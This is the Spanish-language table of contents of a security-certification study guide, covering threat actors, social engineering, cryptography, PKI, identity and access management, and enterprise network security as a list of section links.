<div align="center">
  <img src="../assets/linux.svg" width="200" alt="Logo de Linux">
</div>

## Índice
- [1. Conceptos Fundamentales de Seguridad](#1-conceptos-fundamentales-de-seguridad)
  - [1.1.1 Seguridad de la Información (Infosec)](#111-seguridad-de-la-información-infosec)
    - [¿Qué es la Seguridad de la Información?](#qué-es-la-seguridad-de-la-información)
    - [Tríada CIA (también llamada AIC)](#tríada-cia-también-llamada-aic)
    - [No Repudio](#no-repudio)
  - [1.1.2 Marco de Ciberseguridad (CSF)](#112-marco-de-ciberseguridad-csf)
    - [¿Qué es la Ciberseguridad?](#qué-es-la-ciberseguridad)
    - [Marco del NIST (National Institute of Standards and Technology)](#marco-del-nist-national-institute-of-standards-and-technology)
  - [1.1.3 Análisis de Deficiencias (Gap Analysis)](#113-análisis-de-deficiencias-gap-analysis)
    - [¿Por qué se necesitan marcos?](#por-qué-se-necesitan-marcos)
    - [El Análisis de Deficiencias (Gap Analysis)](#el-análisis-de-deficiencias-gap-analysis)
    - [Informe de Análisis de Deficiencias](#informe-de-análisis-de-deficiencias)
  - [1.1.4 Control de Acceso e IAM](#114-control-de-acceso-e-iam)
    - [¿Qué es el Control de Acceso?](#qué-es-el-control-de-acceso)
    - [IAM — Gestión de Identidades y Accesos](#iam--gestión-de-identidades-y-accesos)
    - [Ejemplo Práctico: E-Commerce](#ejemplo-práctico-e-commerce)
  - [1.2.1 Clasificación de los Controles de Seguridad](#121-clasificación-de-los-controles-de-seguridad)
    - [¿Qué es un Control de Seguridad?](#qué-es-un-control-de-seguridad)
    - [Las 4 Categorías de Controles (por FORMA de implementación)](#las-4-categorías-de-controles-por-forma-de-implementación)
  - [1.2.2 Tipos Funcionales de Controles de Seguridad](#122-tipos-funcionales-de-controles-de-seguridad)
    - [Clasificación por FUNCIÓN u OBJETIVO](#clasificación-por-función-u-objetivo)
      - [Controles Principales (los 3 fundamentales)](#controles-principales-los-3-fundamentales)
      - [Controles Adicionales (tipos complementarios)](#controles-adicionales-tipos-complementarios)
    - [Tabla Comparativa Completa](#tabla-comparativa-completa)
    - [Caso especial: Gestión de Parches](#caso-especial-gestión-de-parches)
  - [1.2.3 Funciones y Responsabilidades de Seguridad](#123-funciones-y-responsabilidades-de-seguridad)
    - [¿Qué es una Política de Seguridad?](#qué-es-una-política-de-seguridad)
    - [Jerarquía de Roles y Responsabilidades](#jerarquía-de-roles-y-responsabilidades)
  - [1.2.4 Competencias de la Seguridad de la Información](#124-competencias-de-la-seguridad-de-la-información)
    - [¿Qué hace un profesional de seguridad de TI?](#qué-hace-un-profesional-de-seguridad-de-ti)
  - [1.2.5 Unidades de Negocio de Seguridad de la Información](#125-unidades-de-negocio-de-seguridad-de-la-información)
    - [Unidades organizativas de seguridad](#unidades-organizativas-de-seguridad)
    - [SOC — Centro de Operaciones de Seguridad](#soc--centro-de-operaciones-de-seguridad)
    - [DevSecOps](#devsecops)
    - [CIRT / CSIRT / CERT — Equipo de Respuesta a Incidentes](#cirt--csirt--cert--equipo-de-respuesta-a-incidentes)
  - [1.3 Glosario del Tema 01](#13-glosario-del-tema-01)
- [2. Tipos de Amenazas](#2-tipos-de-amenazas)
  - [2.1 Actores de Amenazas](#21-actores-de-amenazas)
    - [2.1.1 Vulnerabilidad, Amenaza y Riesgo](#211-vulnerabilidad-amenaza-y-riesgo)
      - [Fórmula del Riesgo](#fórmula-del-riesgo)
    - [2.1.2 Atributos de los Actores de Amenazas](#212-atributos-de-los-actores-de-amenazas)
      - [Los 4 Atributos de Clasificación](#los-4-atributos-de-clasificación)
    - [2.1.3 Motivaciones de los Actores de Amenazas](#213-motivaciones-de-los-actores-de-amenazas)
      - [Clasificación por Estructuración del Ataque](#clasificación-por-estructuración-del-ataque)
      - [Las 3 Estrategias Generales de Ataque (Relación con Tríada CIA)](#las-3-estrategias-generales-de-ataque-relación-con-tríada-cia)
      - [Tipos de Motivaciones](#tipos-de-motivaciones)
    - [2.1.4 Hackers y Hacktivistas](#214-hackers-y-hacktivistas)
      - [Tipos de Hackers](#tipos-de-hackers)
    - [2.1.5 Actores de Estados Nación](#215-actores-de-estados-nación)
    - [2.1.6 Crimen Organizado y Competidores](#216-crimen-organizado-y-competidores)
      - [Crimen Organizado](#crimen-organizado)
      - [Espionaje Comercial (Competidores)](#espionaje-comercial-competidores)
    - [2.1.7 Actores de Amenazas Internos](#217-actores-de-amenazas-internos)
      - [Clasificación de Amenazas Internas](#clasificación-de-amenazas-internas)
      - [Por Intencionalidad](#por-intencionalidad)
      - [Conceptos Importantes](#conceptos-importantes)
  - [2.2 Superficies de Ataque](#22-superficies-de-ataque)
    - [2.2.1 Superficie de Ataque y Vectores de Amenaza](#221-superficie-de-ataque-y-vectores-de-amenaza)
      - [Tipos de Superficies de Ataque](#tipos-de-superficies-de-ataque)
      - [Características de los Ataques Sofisticados](#características-de-los-ataques-sofisticados)
    - [2.2.2 Vectores de Software Vulnerable](#222-vectores-de-software-vulnerable)
      - [Sistemas y Aplicaciones No Compatibles (End-of-Life / EOL)](#sistemas-y-aplicaciones-no-compatibles-end-of-life--eol)
      - [Escaneo de Vulnerabilidades: Basado en Cliente vs. Sin Agente](#escaneo-de-vulnerabilidades-basado-en-cliente-vs-sin-agente)
    - [2.2.3 Vectores de Red](#223-vectores-de-red)
      - [Clasificación de Exploits: Remoto vs. Local](#clasificación-de-exploits-remoto-vs-local)
      - [Redes No Seguras: Impacto en la Tríada CIA](#redes-no-seguras-impacto-en-la-tríada-cia)
      - [Vectores de Red Específicos](#vectores-de-red-específicos)
      - [Principio de Reducción de la Superficie de Red](#principio-de-reducción-de-la-superficie-de-red)
    - [2.2.4 Vectores Basados en Señuelos](#224-vectores-basados-en-señuelos)
      - [Tipos de Señuelos](#tipos-de-señuelos)
      - [Reducción de la Superficie de Ataque por Señuelos](#reducción-de-la-superficie-de-ataque-por-señuelos)
    - [2.2.5 Vectores Basados en Mensajes](#225-vectores-basados-en-mensajes)
      - [Canales de Mensajería como Vectores de Amenaza](#canales-de-mensajería-como-vectores-de-amenaza)
      - [Conceptos Críticos](#conceptos-críticos)
    - [2.2.6 Superficie de Ataque de la Cadena de Suministro](#226-superficie-de-ataque-de-la-cadena-de-suministro)
      - [Gestión de Adquisiciones (Acquisition Management)](#gestión-de-adquisiciones-acquisition-management)
      - [La Amplitud de la Cadena de Suministro](#la-amplitud-de-la-cadena-de-suministro)
      - [MSP (Managed Service Provider — Proveedor de Servicios Administrados)](#msp-managed-service-provider--proveedor-de-servicios-administrados)
      - [Mejores Prácticas](#mejores-prácticas)
  - [2.3 Ingeniería Social](#23-ingeniería-social)
    - [2.3.1 Vectores Humanos](#231-vectores-humanos)
      - [Usos de la Ingeniería Social](#usos-de-la-ingeniería-social)
      - [Escenarios de Ejemplo del PDF](#escenarios-de-ejemplo-del-pdf)
    - [2.3.2 Suplantación y Pretexting](#232-suplantación-y-pretexting)
      - [Suplantación (Impersonation)](#suplantación-impersonation)
      - [Pretexting](#pretexting)
    - [2.3.3 Phishing y Pharming](#233-phishing-y-pharming)
      - [Phishing (Suplantación de Identidad)](#phishing-suplantación-de-identidad)
      - [Variantes de Phishing por Canal](#variantes-de-phishing-por-canal)
      - [Pharming (Redireccionamiento)](#pharming-redireccionamiento)
    - [2.3.4 Typosquatting](#234-typosquatting)
      - [Definición y Técnicas](#definición-y-técnicas)
      - [Técnicas Relacionadas de Suplantación de Origen](#técnicas-relacionadas-de-suplantación-de-origen)
    - [2.3.5 Compromiso de Correo Electrónico Empresarial (BEC)](#235-compromiso-de-correo-electrónico-empresarial-bec)
      - [BEC (Business Email Compromise — Compromiso de Correo Electrónico Empresarial)](#bec-business-email-compromise--compromiso-de-correo-electrónico-empresarial)
      - [Terminología de Ataques Altamente Dirigidos](#terminología-de-ataques-altamente-dirigidos)
      - [Suplantación de Marca (Brand Impersonation)](#suplantación-de-marca-brand-impersonation)
      - [Desinformación vs. Malinformación](#desinformación-vs-malinformación)
      - [Watering Hole Attack (Ataque de Abrevadero)](#watering-hole-attack-ataque-de-abrevadero)
  - [2.4 Tabla Resumen: Tipos de Actores de Amenaza](#24-tabla-resumen-tipos-de-actores-de-amenaza)
    - [2.4.1 Actores de Amenaza](#241-actores-de-amenaza)
    - [2.4.2 Vectores de Amenaza](#242-vectores-de-amenaza)
  - [2.6 Glosario Completo del Tema 02](#26-glosario-completo-del-tema-02)
- [3. Algoritmos Criptográficos](#3-algoritmos-criptográficos)
  - [3.1.1 Conceptos Criptográficos](#311-conceptos-criptográficos)
    - [Terminología fundamental](#terminología-fundamental)
    - [Personajes estándar en criptografía (notación académica)](#personajes-estándar-en-criptografía-notación-académica)
    - [Tres tipos principales de algoritmos criptográficos](#tres-tipos-principales-de-algoritmos-criptográficos)
  - [3.1.2 Cifrado Simétrico (Symmetric Encryption)](#312-cifrado-simétrico-symmetric-encryption)
    - [Algoritmos base: Sustitución y Transposición](#algoritmos-base-sustitución-y-transposición)
    - [Cómo funciona el cifrado simétrico](#cómo-funciona-el-cifrado-simétrico)
    - [Ventajas y limitaciones](#ventajas-y-limitaciones)
  - [3.1.3 Longitud de la Clave](#313-longitud-de-la-clave)
    - [Fórmula del espacio de claves](#fórmula-del-espacio-de-claves)
    - [Tabla comparativa de longitudes](#tabla-comparativa-de-longitudes)
  - [3.1.4 Cifrado Asimétrico (Asymmetric Encryption)](#314-cifrado-asimétrico-asymmetric-encryption)
    - [Funcionamiento del par de claves](#funcionamiento-del-par-de-claves)
    - [Flujo de cifrado asimétrico](#flujo-de-cifrado-asimétrico)
    - [Comparativa simétrico vs. asimétrico](#comparativa-simétrico-vs-asimétrico)
    - [Algoritmos asimétricos principales](#algoritmos-asimétricos-principales)
  - [3.1.5 Hashing](#315-hashing)
    - [Características del hashing criptográfico](#características-del-hashing-criptográfico)
    - [Usos del hashing](#usos-del-hashing)
    - [Algoritmos de hashing principales](#algoritmos-de-hashing-principales)
  - [3.1.6 Firmas Digitales](#316-firmas-digitales)
    - [Primitivo criptográfico vs. Conjunto de cifrado](#primitivo-criptográfico-vs-conjunto-de-cifrado)
    - [Cómo funciona una firma digital](#cómo-funciona-una-firma-digital)
    - [Propiedades garantizadas](#propiedades-garantizadas)
    - [Estándares de firma digital](#estándares-de-firma-digital)
- [3.2 Infraestructura de Clave Pública (PKI)](#32-infraestructura-de-clave-pública-pki)
  - [3.2.1 Autoridades Certificadoras (CA)](#321-autoridades-certificadoras-ca)
    - [El problema que resuelve la PKI](#el-problema-que-resuelve-la-pki)
    - [Funciones de una CA pública de terceros](#funciones-de-una-ca-pública-de-terceros)
    - [Ejemplos de CA de terceros](#ejemplos-de-ca-de-terceros)
    - [Flujo PKI completo](#flujo-pki-completo)
  - [3.2.2 Certificados Digitales](#322-certificados-digitales)
    - [Componentes de un certificado digital](#componentes-de-un-certificado-digital)
    - [Estándares de certificados](#estándares-de-certificados)
  - [3.2.3 Raíz de Confianza](#323-raíz-de-confianza)
    - [Certificado raíz](#certificado-raíz)
    - [Modelos de PKI](#modelos-de-pki)
      - [Modelo 1: CA Única (Single CA)](#modelo-1-ca-única-single-ca)
      - [Modelo 2: CA Jerárquica (Modelo de Terceros)](#modelo-2-ca-jerárquica-modelo-de-terceros)
      - [Modelo 3: Certificados Autofirmados (Self-Signed)](#modelo-3-certificados-autofirmados-self-signed)
  - [3.2.4 Solicitudes de Firma de Certificados (CSR)](#324-solicitudes-de-firma-de-certificados-csr)
    - [Proceso de registro y emisión](#proceso-de-registro-y-emisión)
  - [3.2.5 Atributos del Nombre del Sujeto](#325-atributos-del-nombre-del-sujeto)
    - [Campo CN (Common Name / Nombre Común)](#campo-cn-common-name--nombre-común)
    - [Campo SAN (Subject Alternative Name / Nombre Alternativo del Sujeto)](#campo-san-subject-alternative-name--nombre-alternativo-del-sujeto)
    - [Tipos de SAN](#tipos-de-san)
    - [Campos del nombre distinguido (DN)](#campos-del-nombre-distinguido-dn)
  - [3.2.6 Revocación de Certificados](#326-revocación-de-certificados)
    - [Estados de un certificado](#estados-de-un-certificado)
    - [Razones de revocación](#razones-de-revocación)
    - [CRL (Certificate Revocation List / Lista de Revocación de Certificados)](#crl-certificate-revocation-list--lista-de-revocación-de-certificados)
    - [OCSP (Online Certificate Status Protocol / Protocolo de Estado de Certificados en Línea)](#ocsp-online-certificate-status-protocol--protocolo-de-estado-de-certificados-en-línea)
  - [3.2.7 Gestión de Claves](#327-gestión-de-claves)
    - [Ciclo de vida de una clave](#ciclo-de-vida-de-una-clave)
    - [Modelos de gestión de claves](#modelos-de-gestión-de-claves)
    - [KMIP (Key Management Interoperability Protocol / Protocolo de Interoperabilidad de Gestión de Claves)](#kmip-key-management-interoperability-protocol--protocolo-de-interoperabilidad-de-gestión-de-claves)
  - [3.2.8 Criptoprocesadores y Enclaves Seguros](#328-criptoprocesadores-y-enclaves-seguros)
    - [Problemas del almacenamiento de claves en sistema de archivos](#problemas-del-almacenamiento-de-claves-en-sistema-de-archivos)
    - [TPM (Trusted Platform Module / Módulo de Plataforma Confiable)](#tpm-trusted-platform-module--módulo-de-plataforma-confiable)
    - [HSM (Hardware Security Module / Módulo de Seguridad de Hardware)](#hsm-hardware-security-module--módulo-de-seguridad-de-hardware)
    - [PKCS#11](#pkcs11)
    - [Enclave Seguro (Secure Enclave / TEE)](#enclave-seguro-secure-enclave--tee)
    - [Resumen comparativo TPM vs. HSM](#resumen-comparativo-tpm-vs-hsm)
  - [3.2.9 Custodia de Claves](#329-custodia-de-claves)
    - [El problema de las copias de seguridad de claves](#el-problema-de-las-copias-de-seguridad-de-claves)
    - [Soluciones: Custodia y Control M de N](#soluciones-custodia-y-control-m-de-n)
    - [División de claves](#división-de-claves)
- [3.3 Soluciones Criptográficas](#33-soluciones-criptográficas)
  - [3.3.1 Cifrado que Respalda la Confidencialidad](#331-cifrado-que-respalda-la-confidencialidad)
    - [Estados de los datos](#estados-de-los-datos)
    - [Cifrado masivo (Bulk Encryption)](#cifrado-masivo-bulk-encryption)
    - [Esquema híbrido para cifrado de datos](#esquema-híbrido-para-cifrado-de-datos)
  - [3.3.2 Cifrado de Archivos y Discos](#332-cifrado-de-archivos-y-discos)
    - [Niveles de cifrado de datos en reposo](#niveles-de-cifrado-de-datos-en-reposo)
    - [FDE (Full Disk Encryption / Cifrado de Disco Completo)](#fde-full-disk-encryption--cifrado-de-disco-completo)
    - [Cifrado de particiones](#cifrado-de-particiones)
    - [Cifrado de volúmenes](#cifrado-de-volúmenes)
    - [Cifrado de archivos individuales](#cifrado-de-archivos-individuales)
  - [3.3.3 Cifrado de Base de Datos](#333-cifrado-de-base-de-datos)
    - [Estructura de una base de datos](#estructura-de-una-base-de-datos)
    - [Niveles de cifrado en BD](#niveles-de-cifrado-en-bd)
      - [Nivel 1: Cifrado de Base de Datos (TDE)](#nivel-1-cifrado-de-base-de-datos-tde)
      - [Nivel 2: Cifrado de Celda/Columna](#nivel-2-cifrado-de-celdacolumna)
      - [Nivel 3: Cifrado a Nivel de Registro/Fila](#nivel-3-cifrado-a-nivel-de-registrofila)
    - [Comparativa de niveles de cifrado en BD](#comparativa-de-niveles-de-cifrado-en-bd)
  - [3.3.4 Cifrado de Transporte e Intercambio de Claves](#334-cifrado-de-transporte-e-intercambio-de-claves)
    - [Protocolos de cifrado de transporte](#protocolos-de-cifrado-de-transporte)
    - [Sobre digital (Digital Envelope) — Flujo de intercambio de claves](#sobre-digital-digital-envelope--flujo-de-intercambio-de-claves)
    - [Integridad y autenticidad en el transporte](#integridad-y-autenticidad-en-el-transporte)
  - [3.3.5 Secreto de Reenvío Perfecto (PFS)](#335-secreto-de-reenvío-perfecto-pfs)
    - [El problema sin PFS](#el-problema-sin-pfs)
    - [PFS (Perfect Forward Secrecy / Secreto de Reenvío Perfecto)](#pfs-perfect-forward-secrecy--secreto-de-reenvío-perfecto)
    - [Protocolo Diffie-Hellman — Cómo funciona](#protocolo-diffie-hellman--cómo-funciona)
    - [Ventajas del PFS](#ventajas-del-pfs)
    - [Implementaciones de PFS](#implementaciones-de-pfs)
  - [3.3.6 Salting y Key Stretching](#336-salting-y-key-stretching)
    - [El problema de la baja entropía en contraseñas](#el-problema-de-la-baja-entropía-en-contraseñas)
    - [Salting](#salting)
    - [Key Stretching (Estiramiento de Claves)](#key-stretching-estiramiento-de-claves)
  - [3.3.7 Blockchain](#337-blockchain)
    - [Conceptos clave de Blockchain](#conceptos-clave-de-blockchain)
    - [Características de la Blockchain](#características-de-la-blockchain)
    - [Aplicaciones potenciales](#aplicaciones-potenciales)
  - [3.3.8 Ofuscación](#338-ofuscación)
    - [Concepto](#concepto)
    - [Técnicas de ofuscación](#técnicas-de-ofuscación)
      - [1. Esteganografía (Steganography)](#1-esteganografía-steganography)
      - [2. Enmascaramiento de datos (Data Masking)](#2-enmascaramiento-de-datos-data-masking)
      - [3. Tokenización (Tokenization)](#3-tokenización-tokenization)
    - [Tabla comparativa de técnicas de ofuscación](#tabla-comparativa-de-técnicas-de-ofuscación)
    - [Desidentificación](#desidentificación)
  - [3.8 Gestión de claves](#38-gestión-de-claves)
  - [3.9 Criptoprocesadores y enclaves seguros](#39-criptoprocesadores-y-enclaves-seguros)
    - [TPM vs. HSM](#tpm-vs-hsm)
    - [Custodia de Claves y Recuperación](#custodia-de-claves-y-recuperación)
    - [Enclaves Seguros](#enclaves-seguros)
  - [3.10 Custodia de Claves (Key Escrow)](#310-custodia-de-claves-key-escrow)
  - [3.11 Ofuscación](#311-ofuscación)
    - [Esteganografía](#esteganografía)
    - [Enmascaramiento de Datos (Data Masking)](#enmascaramiento-de-datos-data-masking)
    - [Tokenización](#tokenización)
  - [3.12 Cifrado que Respalda la Confidencialidad](#312-cifrado-que-respalda-la-confidencialidad)
    - [Los Tres Estados de los Datos](#los-tres-estados-de-los-datos)
    - [El Esquema de Cifrado Estándar (Confidencialidad de Archivos)](#el-esquema-de-cifrado-estándar-confidencialidad-de-archivos)
    - [Cifrado de Archivos y Discos](#cifrado-de-archivos-y-discos)
    - [Cifrado de Bases de Datos](#cifrado-de-bases-de-datos)
    - [Cifrado de Transporte e Intercambio de Claves](#cifrado-de-transporte-e-intercambio-de-claves)
    - [Secreto de Reenvío Perfecto (Perfect Forward Secrecy - PFS)](#secreto-de-reenvío-perfecto-perfect-forward-secrecy---pfs)
    - [Protección de Contraseñas (Salting y Stretching)](#protección-de-contraseñas-salting-y-stretching)
  - [3.13 Blockchain (Cadena de Bloques)](#313-blockchain-cadena-de-bloques)
    - [Componentes de Seguridad en Blockchain](#componentes-de-seguridad-en-blockchain)
  - [3.14 Tabla Resumen](#314-tabla-resumen)
- [4. Implementación de la gestión de identidades y accesos](#4-implementación-de-la-gestión-de-identidades-y-accesos)
  - [4.1 Autenticación](#41-autenticación)
    - [Arquitectura básica del proceso de autenticación](#arquitectura-básica-del-proceso-de-autenticación)
    - [4.1.1 Diseño de Autenticación](#411-diseño-de-autenticación)
      - [Los factores de autenticación](#los-factores-de-autenticación)
    - [4.1.2 Conceptos sobre Contraseñas](#412-conceptos-sobre-contraseñas)
      - [Componentes de una política de contraseñas sólida](#componentes-de-una-política-de-contraseñas-sólida)
      - [Distinción clave: Antigüedad vs. Caducidad](#distinción-clave-antigüedad-vs-caducidad)
      - [🔔 Nota NIST (National Institute of Standards and Technology)](#-nota-nist-national-institute-of-standards-and-technology)
    - [4.1.3 Administradores de Contraseñas](#413-administradores-de-contraseñas)
      - [Flujo de funcionamiento de un administrador de contraseñas](#flujo-de-funcionamiento-de-un-administrador-de-contraseñas)
      - [Riesgos principales de los administradores de contraseñas](#riesgos-principales-de-los-administradores-de-contraseñas)
    - [4.1.4 Autenticación de Multifactores (MFA)](#414-autenticación-de-multifactores-mfa)
      - [Regla de oro de MFA](#regla-de-oro-de-mfa)
      - [2FA (Two-Factor Authentication) vs. MFA](#2fa-two-factor-authentication-vs-mfa)
      - [Factor de ubicación — Casos de uso](#factor-de-ubicación--casos-de-uso)
    - [4.1.5 Autenticación Biométrica](#415-autenticación-biométrica)
      - [Proceso de configuración biométrica](#proceso-de-configuración-biométrica)
      - [Métricas de rendimiento biométrico](#métricas-de-rendimiento-biométrico)
      - [Regla de oro de las métricas](#regla-de-oro-de-las-métricas)
      - [Tipos de biometría](#tipos-de-biometría)
      - [Consideraciones adicionales](#consideraciones-adicionales)
    - [4.1.6 Tokens de Autenticación Físicos](#416-tokens-de-autenticación-físicos)
      - [Tres tipos de generación de tokens](#tres-tipos-de-generación-de-tokens)
      - [TOTP vs. HOTP](#totp-vs-hotp)
      - [Tipos de autenticadores físicos](#tipos-de-autenticadores-físicos)
      - [⚠️ Tokens estáticos — Riesgo crítico](#️-tokens-estáticos--riesgo-crítico)
    - [4.1.7 Tokens de Autenticación Blandos](#417-tokens-de-autenticación-blandos)
      - [Métodos de entrega de tokens blandos](#métodos-de-entrega-de-tokens-blandos)
      - [Flujo de la aplicación autenticadora](#flujo-de-la-aplicación-autenticadora)
    - [4.1.8 Autenticación Sin Contraseña](#418-autenticación-sin-contraseña)
      - [FIDO2 y WebAuthn — El estándar](#fido2-y-webauthn--el-estándar)
      - [Flujo de autenticación sin contraseña (FIDO2/WebAuthn)](#flujo-de-autenticación-sin-contraseña-fido2webauthn)
      - [FIDO U2F vs. FIDO2/WebAuthn](#fido-u2f-vs-fido2webauthn)
      - [Attestation (Ratificación)](#attestation-ratificación)
  - [4.2 Autorización](#42-autorización)
    - [4.2.1 Control de Acceso Discrecional y Obligatorio](#421-control-de-acceso-discrecional-y-obligatorio)
      - [DAC — Discretionary Access Control (Control de Acceso Discrecional)](#dac--discretionary-access-control-control-de-acceso-discrecional)
      - [MAC — Mandatory Access Control (Control de Acceso Obligatorio)](#mac--mandatory-access-control-control-de-acceso-obligatorio)
      - [DAC vs. MAC — Tabla Comparativa](#dac-vs-mac--tabla-comparativa)
    - [4.2.2 Control de Acceso Basado en Funciones y Atributos](#422-control-de-acceso-basado-en-funciones-y-atributos)
      - [RBAC — Role-Based Access Control (Control de Acceso Basado en Funciones)](#rbac--role-based-access-control-control-de-acceso-basado-en-funciones)
      - [Grupos de seguridad como implementación de RBAC](#grupos-de-seguridad-como-implementación-de-rbac)
      - [ABAC — Attribute-Based Access Control (Control de Acceso Basado en Atributos)](#abac--attribute-based-access-control-control-de-acceso-basado-en-atributos)
      - [Control M de N](#control-m-de-n)
      - [RBAC vs. ABAC — Comparativa](#rbac-vs-abac--comparativa)
    - [4.2.3 Control de Acceso Basado en Reglas](#423-control-de-acceso-basado-en-reglas)
      - [Acceso Condicional](#acceso-condicional)
    - [4.2.4 Asignaciones de Permisos de Mínimo Privilegio](#424-asignaciones-de-permisos-de-mínimo-privilegio)
      - [¿Por qué es importante?](#por-qué-es-importante)
      - [Desafíos de implementación](#desafíos-de-implementación)
      - [Acumulación de autorizaciones (Privilege Creep)](#acumulación-de-autorizaciones-privilege-creep)
    - [4.2.5 Aprovisionamiento de Cuentas de Usuario](#425-aprovisionamiento-de-cuentas-de-usuario)
      - [Pasos del aprovisionamiento de una cuenta de usuario](#pasos-del-aprovisionamiento-de-una-cuenta-de-usuario)
      - [Desaprovisionamiento](#desaprovisionamiento)
    - [4.2.6 Atributos de Cuenta y Políticas de Acceso](#426-atributos-de-cuenta-y-políticas-de-acceso)
      - [Componentes de una cuenta de usuario](#componentes-de-una-cuenta-de-usuario)
      - [Permisos y políticas de acceso](#permisos-y-políticas-de-acceso)
      - [GPO — Group Policy Objects (Objetos de Directiva de Grupo) en Windows](#gpo--group-policy-objects-objetos-de-directiva-de-grupo-en-windows)
    - [4.2.7 Restricciones de la Cuenta](#427-restricciones-de-la-cuenta)
      - [Políticas basadas en la ubicación](#políticas-basadas-en-la-ubicación)
      - [Políticas basadas en el tiempo](#políticas-basadas-en-el-tiempo)
    - [4.2.8 Administración de Acceso con Privilegios (PAM)](#428-administración-de-acceso-con-privilegios-pam)
      - [Tipos de cuentas por nivel de privilegio](#tipos-de-cuentas-por-nivel-de-privilegio)
      - [PAM — Privileged Access Management (Administración de Acceso Privilegiado)](#pam--privileged-access-management-administración-de-acceso-privilegiado)
      - [Buenas prácticas de PAM](#buenas-prácticas-de-pam)
      - [JIT — Just-in-Time Permissions (Permisos Justo a Tiempo)](#jit--just-in-time-permissions-permisos-justo-a-tiempo)
      - [Tres modelos de implementación de JIT/ZSP](#tres-modelos-de-implementación-de-jitzsp)
  - [4.3 Administración de Identidades](#43-administración-de-identidades)
    - [4.3.1 Autenticación Local, de Red y Remota](#431-autenticación-local-de-red-y-remota)
      - [Principio base: almacenamiento de credenciales](#principio-base-almacenamiento-de-credenciales)
      - [Autenticación en Windows](#autenticación-en-windows)
      - [Autenticación en Linux](#autenticación-en-linux)
    - [4.3.2 Servicios de Directorio](#432-servicios-de-directorio)
      - [LDAP — Lightweight Directory Access Protocol (Protocolo Ligero de Acceso a Directorios)](#ldap--lightweight-directory-access-protocol-protocolo-ligero-de-acceso-a-directorios)
      - [Estructura de nombres en LDAP (basada en X.500)](#estructura-de-nombres-en-ldap-basada-en-x500)
    - [4.3.3 Autenticación de Inicio de Sesión Único (SSO) — Kerberos](#433-autenticación-de-inicio-de-sesión-único-sso--kerberos)
      - [Kerberos — El guardián de tres cabezas](#kerberos--el-guardián-de-tres-cabezas)
      - [Los dos servicios del KDC](#los-dos-servicios-del-kdc)
      - [Fase 1 — Autenticación con el KDC (obtención del TGT)](#fase-1--autenticación-con-el-kdc-obtención-del-tgt)
    - [4.3.4 Autorización de Inicio de Sesión Único (Kerberos TGS)](#434-autorización-de-inicio-de-sesión-único-kerberos-tgs)
      - [Fase 2 — Autorización con el TGS (obtención del ticket de servicio)](#fase-2--autorización-con-el-tgs-obtención-del-ticket-de-servicio)
      - [Punto débil de Kerberos](#punto-débil-de-kerberos)
    - [4.3.5 Federation (Federación de Identidades)](#435-federation-federación-de-identidades)
      - [¿Qué es la Federación?](#qué-es-la-federación)
      - [Por qué Kerberos/LDAP no es suficiente para la federación](#por-qué-kerberosldap-no-es-suficiente-para-la-federación)
      - [Terminología de federación](#terminología-de-federación)
      - [Flujo de autenticación federada](#flujo-de-autenticación-federada)
    - [4.3.6 SAML (Security Assertion Markup Language)](#436-saml-security-assertion-markup-language)
      - [¿Qué es SAML?](#qué-es-saml)
      - [Ejemplo de implementación SAML](#ejemplo-de-implementación-saml)
      - [Estructura básica de una respuesta SAML (XML)](#estructura-básica-de-una-respuesta-saml-xml)
      - [Características técnicas de SAML](#características-técnicas-de-saml)
    - [4.3.7 OAuth (Open Authorization)](#437-oauth-open-authorization)
      - [El contexto: APIs RESTful vs. SOAP](#el-contexto-apis-restful-vs-soap)
      - [¿Qué es OAuth?](#qué-es-oauth)
      - [Actores en OAuth](#actores-en-oauth)
      - [Flujo básico de OAuth](#flujo-básico-de-oauth)
      - [JWT — JSON Web Token](#jwt--json-web-token)
      - [SAML vs. OAuth — Comparativa Maestra](#saml-vs-oauth--comparativa-maestra)
  - [🗺️ Tabla Maestra de Comparación de Modelos de Control de Acceso](#️-tabla-maestra-de-comparación-de-modelos-de-control-de-acceso)
  - [🚀 Glosario Rápido de Acrónimos](#-glosario-rápido-de-acrónimos)
  - [💡 Resumen de Preguntas Clave de Examen (Cheat Sheet)](#-resumen-de-preguntas-clave-de-examen-cheat-sheet)
  - [5.1 Arquitectura de Red Empresarial](#51-arquitectura-de-red-empresarial)
    - [5.1.1 Conceptos de Arquitectura e Infraestructura](#511-conceptos-de-arquitectura-e-infraestructura)
      - [Ejemplo práctico: Flujo de trabajo del correo electrónico](#ejemplo-práctico-flujo-de-trabajo-del-correo-electrónico)
    - [5.1.2 Infraestructura de Red](#512-infraestructura-de-red)
      - [Tipos de nodos](#tipos-de-nodos)
      - [Alcances de red](#alcances-de-red)
      - [Protocolo de Resolución de Direcciones](#protocolo-de-resolución-de-direcciones)
      - [FQDN (Fully Qualified Domain Name — Nombre de Dominio Completamente Calificado)](#fqdn-fully-qualified-domain-name--nombre-de-dominio-completamente-calificado)
    - [5.1.3 Consideraciones de Infraestructura de Conmutación](#513-consideraciones-de-infraestructura-de-conmutación)
      - [Cableado Estructurado (topología en estrella)](#cableado-estructurado-topología-en-estrella)
      - [Problemas de la topología plana (estrella básica)](#problemas-de-la-topología-plana-estrella-básica)
      - [Solución: Diseño jerárquico](#solución-diseño-jerárquico)
    - [5.1.4 Consideraciones sobre la Infraestructura de Enrutamiento](#514-consideraciones-sobre-la-infraestructura-de-enrutamiento)
      - [Protocolo de Internet (IP)](#protocolo-de-internet-ip)
      - [VLAN (Virtual LAN — Red de Área Local Virtual)](#vlan-virtual-lan--red-de-área-local-virtual)
      - [Ejemplo VoIP vs. Estaciones de trabajo](#ejemplo-voip-vs-estaciones-de-trabajo)
    - [5.1.5 Zonas de Seguridad](#515-zonas-de-seguridad)
      - [Análisis de requisitos por tipo de sistema](#análisis-de-requisitos-por-tipo-de-sistema)
      - [Ejemplo de zonas en diagrama](#ejemplo-de-zonas-en-diagrama)
      - [Reglas clave de control de tráfico entre zonas](#reglas-clave-de-control-de-tráfico-entre-zonas)
    - [5.1.6 Superficie de Ataque](#516-superficie-de-ataque)
      - [Análisis por capa OSI](#análisis-por-capa-osi)
      - [Debilidades típicas de arquitectura](#debilidades-típicas-de-arquitectura)
      - [Defensa en profundidad (Defense in Depth)](#defensa-en-profundidad-defense-in-depth)
    - [5.1.7 Seguridad del Puerto](#517-seguridad-del-puerto)
      - [Medidas básicas](#medidas-básicas)
      - [Filtrado MAC y Limitación MAC](#filtrado-mac-y-limitación-mac)
      - [802.1X y EAP (Extensible Authentication Protocol — Protocolo de Autenticación Extensible)](#8021x-y-eap-extensible-authentication-protocol--protocolo-de-autenticación-extensible)
      - [Protocolos de 802.1X](#protocolos-de-8021x)
